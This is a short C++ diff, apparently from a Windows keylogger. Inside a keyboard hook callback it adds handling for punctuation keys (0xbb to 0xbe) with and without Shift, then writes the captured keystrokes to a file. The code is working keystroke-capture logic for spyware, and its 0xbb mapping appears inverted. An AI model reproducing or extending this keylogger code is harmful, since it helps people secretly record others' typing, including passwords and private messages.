@@ -128,6 +128,43 @@ LRESULT CALLBACK KeyBoardHookCallBack(int code, WPARAM wParam, LPARAM lParam)
 						key.push_back(KeyCode + 32);
 					}
 				}
+				else
+				{
+					if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
+						switch (KeyCode)
+						{
+						case 0xbb:
+							key.push_back('=');
+							break;
+						case 0xbc:
+							key.push_back('<');
+							break;
+						case 0xbd:
+							key.push_back('_');
+							break;
+						case 0xbe:
+							key.push_back('>');
+							break;
+						}
+					}
+					else {
+						switch (KeyCode)
+						{
+						case 0xbb:
+							key.push_back('+');
+							break;
+						case 0xbc:
+							key.push_back(',');
+							break;
+						case 0xbd:
+							key.push_back('-');
+							break;
+						case 0xbe:
+							key.push_back('.');
+							break;
+						}
+					}
+				}
 			}
 			// write
 			f.write(key.c_str(), key.length());
